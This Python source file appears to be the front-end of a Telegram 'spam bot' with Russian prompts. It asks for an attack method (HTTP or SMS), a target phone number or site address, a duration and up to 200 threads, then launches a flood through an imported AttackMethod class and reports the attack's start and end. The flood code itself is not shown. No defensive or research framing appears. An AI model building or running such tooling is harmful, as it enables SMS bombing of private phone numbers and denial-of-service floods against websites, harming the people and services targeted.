import os

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.utils.exceptions import NetworkError, TerminatedByOtherGetUpdates

from loader import dp
from tools.states import SpamState
from tools.keyboards import (
    select_keyboard, 
    start_spam, 
    stop_spam, 
    method_keyboard,
    time_keyboard,
    threads_keyboard
)
from tools.method import AttackMethod

os.chdir(os.path.dirname(os.path.realpath(__file__)))


@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    """Приветственное сообщение"""
    await message.answer("Привет! Я спам-бот\nНажимай на "
                         "кнопки нижи для управления",
                         reply_markup=select_keyboard())


@dp.message_handler(lambda message: message.text == start_spam)
async def get_method(message: types.Message):
    await message.answer('Введите метод (HTTP, SMS)',
                         reply_markup=method_keyboard())
    await SpamState.method.set()


@dp.message_handler(state=SpamState.method)
async def add_method(message: types.Message, state: FSMContext):
    global method
    method = message.text
    if method.upper():
        if message.text == stop_spam:
            await state.reset_state()
            await message.answer('Атака прервана!', reply_markup=select_keyboard())
        else:
            await state.update_data(answer1=method)
            await message.answer('Введите номер телефона или адрес сайта')
            await SpamState.target.set()
    else:
        method.upper()
        if message.text == stop_spam:
            await state.reset_state()
            await message.answer('Атака прервана!', reply_markup=select_keyboard())
        else:
            await state.update_data(answer1=method)
            await message.answer('Введите номер телефона или адрес сайта')
            await SpamState.target.set()
        


@dp.message_handler(state=SpamState.target)
async def add_time(message: types.Message, state: FSMContext):
    global target
    target = message.text
    if message.text == stop_spam:
        await state.reset_state()
        await message.answer('Атака прервана!', reply_markup=select_keyboard())
    else:
        await state.update_data(answer1=target)
        await message.answer('Введите время спама',
                             reply_markup=time_keyboard())
        await SpamState.time.set()


@dp.message_handler(state=SpamState.time)
async def add_threads(message: types.Message, state: FSMContext):
    global time
    time = message.text
    if message.text == stop_spam:
        await state.reset_state()
        await message.answer('Атака прервана!', reply_markup=select_keyboard())
    else:
        await state.update_data(answer1=time)
        await message.answer('Введите количество потоков (1 - 200) или сделайте выбор с помощью клавиатуры!',
                             reply_markup=threads_keyboard())
        await SpamState.threads.set()


@dp.message_handler(state=SpamState.threads)
async def add_threads(message: types.Message, state: FSMContext):
    global threads
    threads = message.text
    if message.text == stop_spam:
        await state.reset_state()
        await message.answer('Атака прервана!', reply_markup=select_keyboard())
    else:
        await state.update_data(answer1=threads)
        try:
            await message.answer(f'⚠️Атака начата!⚠️\n\n'
                                 f'1️⃣  Метод: {method};\n'
                                 f'2️⃣  Цель: {target};\n'
                                 f'3️⃣  Кол-во потоков: {threads}\n'
                                 f'4️⃣  Время спама: {time} секунд\n\n',
                                 reply_markup=select_keyboard())

            with AttackMethod(
                duration=int(time), name=method, threads=int(threads),
                    target=target
            ) as Flood:
                Flood.Start()
            await message.answer('✅Атака закончена!✅',
                                 reply_markup=select_keyboard())
            await state.finish()
        except Exception:
            await state.reset_state()
            await message.answer('Ошибка!!!', reply_markup=select_keyboard())


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
